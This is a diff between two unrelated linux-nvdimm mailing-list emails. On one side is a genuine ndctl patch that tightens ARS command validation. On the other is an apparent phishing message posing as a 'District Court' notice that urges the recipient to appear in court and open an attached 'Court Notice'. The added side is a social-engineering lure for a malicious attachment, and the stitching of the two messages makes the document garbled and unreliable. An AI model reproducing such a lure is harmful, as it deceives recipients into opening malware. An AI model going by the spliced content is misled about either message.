@@ -1,14 +1,12 @@
 Return-Path: <linux-nvdimm-bounces@lists.01.org>
-Received: from mga09.intel.com (mga09.intel.com [134.134.136.24])
- by ml01.01.org (Postfix) with ESMTP id 7374A1A1F64
- for <linux-nvdimm@lists.01.org>; Thu, 10 Mar 2016 16:46:00 -0800 (PST)
-Subject: [ndctl PATCH 1/3] ndctl: fix ndctl_bus_cmd_new_ars_status() input
- validation
-From: Dan Williams <dan.j.williams@intel.com>
-Date: Thu, 10 Mar 2016 16:45:16 -0800
-Message-ID: <20160311004516.27582.37530.stgit@dwillia2-desk3.jf.intel.com>
-In-Reply-To: <20160311004511.27582.63304.stgit@dwillia2-desk3.jf.intel.com>
-References: <20160311004511.27582.63304.stgit@dwillia2-desk3.jf.intel.com>
+Received: from gusbox.fastbox.org (gusbox.fastbox.org
+ [IPv6:2a00:d880:5:441:123:4567:89ab:cdef])
+ by ml01.01.org (Postfix) with ESMTP id 7CA8B1A1EC1
+ for <linux-nvdimm@lists.01.org>; Fri, 25 Mar 2016 03:48:33 -0700 (PDT)
+Subject: Notice of appearance in Court #00873521
+Date: Fri, 25 Mar 2016 11:48:05 +0100
+From: "District Court" <alfredo.chambers@musa-it.com>
+Message-ID: <f9a34ade27370bbf344e8f27603f1678@musa-it.com>
 MIME-Version: 1.0
 List-Unsubscribe: <https://lists.01.org/mailman/options/linux-nvdimm>,
  <mailto:linux-nvdimm-request@lists.01.org?subject=unsubscribe>
@@ -17,6 +15,7 @@ List-Post: <mailto:linux-nvdimm@lists.01.org>
 List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
 List-Subscribe: <https://lists.01.org/mailman/listinfo/linux-nvdimm>,
  <mailto:linux-nvdimm-request@lists.01.org?subject=subscribe>
+Reply-To: District Court <alfredo.chambers@musa-it.com>
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Errors-To: linux-nvdimm-bounces@lists.01.org
@@ -24,43 +23,17 @@ Sender: "Linux-nvdimm" <linux-nvdimm-bounces@lists.01.org>
 To: linux-nvdimm@lists.01.org
 List-ID: <linux-nvdimm@lists.01.org>
 
-Check that ars_status, rather than ars_cap, commands are supported and
-validate that the reference ars_cap passed in is indeed and ars_cap
-command.
+Notice to Appear,
 
-Cc: Vishal Verma <vishal.l.verma@intel.com>
-Signed-off-by: Dan Williams <dan.j.williams@intel.com>
----
- lib/libndctl-ars.c |    6 +++---
- 1 file changed, 3 insertions(+), 3 deletions(-)
+You have to appear in the Court on the March 29.
+You are kindly asked to prepare and bring the documents relating to the case to Court on the specified date.
+Note: The case may be heard by the judge in your absence if you do not come.
 
-diff --git a/lib/libndctl-ars.c b/lib/libndctl-ars.c
-index ad85191898d4..63d0e5544a36 100644
---- a/lib/libndctl-ars.c
-+++ b/lib/libndctl-ars.c
-@@ -55,7 +55,7 @@ NDCTL_EXPORT struct ndctl_cmd *ndctl_bus_cmd_new_ars_start(struct ndctl_cmd *ars
- 		dbg(ctx, "unsupported cmd\n");
- 		return NULL;
- 	}
--	if (ars_cap->status != 0) {
-+	if (ars_cap->type != ND_CMD_ARS_CAP || ars_cap->status != 0) {
- 		dbg(ctx, "expected sucessfully completed ars_cap command\n");
- 		return NULL;
- 	}
-@@ -94,11 +94,11 @@ NDCTL_EXPORT struct ndctl_cmd *ndctl_bus_cmd_new_ars_status(struct ndctl_cmd *ar
- 	struct ndctl_cmd *cmd;
- 	size_t size;
- 
--	if (!ndctl_bus_is_cmd_supported(bus, ND_CMD_ARS_CAP)) {
-+	if (!ndctl_bus_is_cmd_supported(bus, ND_CMD_ARS_STATUS)) {
- 		dbg(ctx, "unsupported cmd\n");
- 		return NULL;
- 	}
--	if (ars_cap->status != 0) {
-+	if (ars_cap->type != ND_CMD_ARS_CAP || ars_cap->status != 0) {
- 		dbg(ctx, "expected sucessfully completed ars_cap command\n");
- 		return NULL;
- 	}
+The copy of Court Notice is attached to this email.
+
+Regards,
+Alfredo Chambers,
+Clerk of Court.
 
 _______________________________________________
 Linux-nvdimm mailing list
